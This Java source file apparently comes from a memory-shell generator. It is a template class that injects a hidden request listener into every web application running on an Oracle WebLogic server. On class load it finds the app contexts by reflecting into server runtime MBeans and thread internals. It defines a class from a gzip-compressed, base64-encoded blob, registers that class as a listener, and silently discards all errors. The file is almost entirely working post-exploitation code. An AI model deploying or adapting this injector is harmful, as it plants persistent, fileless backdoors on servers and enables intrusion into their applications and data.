package jmg.core.template;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.*;
import java.util.zip.GZIPInputStream;


public class WebLogicListenerInjectorTpl {
    public String getClassName() {
        return "";
    }

    public String getBase64String() throws IOException {
        return "";
    }

    static {
        new WebLogicListenerInjectorTpl();
    }

    public WebLogicListenerInjectorTpl() {
        try {
            Object[] contexts = getContext();
            for (Object context : contexts) {
                Object listener = getListener(context);
                registerListener(context, listener);
            }
        } catch (Exception ignored) {

        }

    }

    public static Object[] getContextsByMbean() throws Throwable {
        HashSet webappContexts = new HashSet();
        Class serverRuntimeClass = Class.forName("weblogic.t3.srvr.ServerRuntime");
        Class webAppServletContextClass = Class.forName("weblogic.servlet.internal.WebAppServletContext");
        Method theOneMethod = serverRuntimeClass.getMethod("theOne");
        theOneMethod.setAccessible(true);
        Object serverRuntime = theOneMethod.invoke(null);

        Method getApplicationRuntimesMethod = serverRuntime.getClass().getMethod("getApplicationRuntimes");
        getApplicationRuntimesMethod.setAccessible(true);
        Object applicationRuntimes = getApplicationRuntimesMethod.invoke(serverRuntime);
        int applicationRuntimeSize = Array.getLength(applicationRuntimes);
        for (int i = 0; i < applicationRuntimeSize; i++) {
            Object applicationRuntime = Array.get(applicationRuntimes, i);

            try {
                Method getComponentRuntimesMethod = applicationRuntime.getClass().getMethod("getComponentRuntimes");
                Object componentRuntimes = getComponentRuntimesMethod.invoke(applicationRuntime);
                int componentRuntimeSize = Array.getLength(componentRuntimes);
                for (int j = 0; j < componentRuntimeSize; j++) {
                    Object context = getFV(Array.get(componentRuntimes, j), "context");
                    if (webAppServletContextClass.isInstance(context)) {
                        webappContexts.add(context);
                    }
                }
            } catch (Throwable e) {

            }

            try {
                Set childrenSet = (Set) getFV(applicationRuntime, "children");
                Iterator iterator = childrenSet.iterator();

                while (iterator.hasNext()) {
                    Object componentRuntime = iterator.next();
                    try {
                        Object context = getFV(componentRuntime, "context");
                        if (webAppServletContextClass.isInstance(context)) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable e) {

                    }
                }

            } catch (Throwable e) {

            }
        }
        return webappContexts.toArray();
    }

    public static Object[] getContextsByThreads() throws Throwable {
        HashSet webappContexts = new HashSet();
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        int threadCount = threadGroup.activeCount();
        Thread[] threads = new Thread[threadCount];
        threadGroup.enumerate(threads);
        for (int i = 0; i < threadCount; i++) {
            Thread thread = threads[i];
            if (thread != null) {
                Object workEntry = getFV(thread, "workEntry");
                if (workEntry != null) {
                    try {
                        Object context = null;
                        Object connectionHandler = getFV(workEntry, "connectionHandler");
                        if (connectionHandler != null) {
                            Object request = getFV(connectionHandler, "request");
                            if (request != null) {
                                context = getFV(request, "context");
                            }
                        }
                        if (context == null) {
                            context = getFV(workEntry, "context");
                        }

                        if (context != null) {
                            webappContexts.add(context);
                        }
                    } catch (Throwable e) {

                    }
                }
            }
        }
        return webappContexts.toArray();
    }

    public static Object[] getContext() {
        HashSet webappContexts = new HashSet();
        try {
            webappContexts.addAll(Arrays.asList(getContextsByMbean()));
        } catch (Throwable e) {

        }
        try {
            webappContexts.addAll(Arrays.asList(getContextsByThreads()));
        } catch (Throwable e) {

        }
        return webappContexts.toArray();
    }

    private Object getListener(Object context) {

        Object listener = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            listener = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class clazz = (Class) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                listener = clazz.newInstance();
            } catch (Throwable tt) {
            }
        }
        return listener;
    }

    public void registerListener(Object context, Object listener) throws Exception {
        String listenerClassName = listener.getClass().getName();
        if (!isInjected(context, listenerClassName)) {
            try {
                Object eventsManager = getFV(context, "eventsManager");
                invokeMethod(eventsManager, "registerEventListener", new Class[]{String.class}, new Object[]{listenerClassName});
            } catch (Exception e) {
            }
        }
    }

    public static boolean isInjected(Object context, String listenerClassName) throws Exception {
        ArrayList requestListeners = (ArrayList) getFV(getFV(context, "eventsManager"), "requestListeners");
        for (int i = 0; i < requestListeners.size(); i++) {
            if (requestListeners.get(i).getClass().getName().contains(listenerClassName)) return true;
        }
        return false;
    }

    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    static Object getFV(Object obj, String fieldName) throws Exception {
        Field field = getF(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }


    private static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;

        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }
}
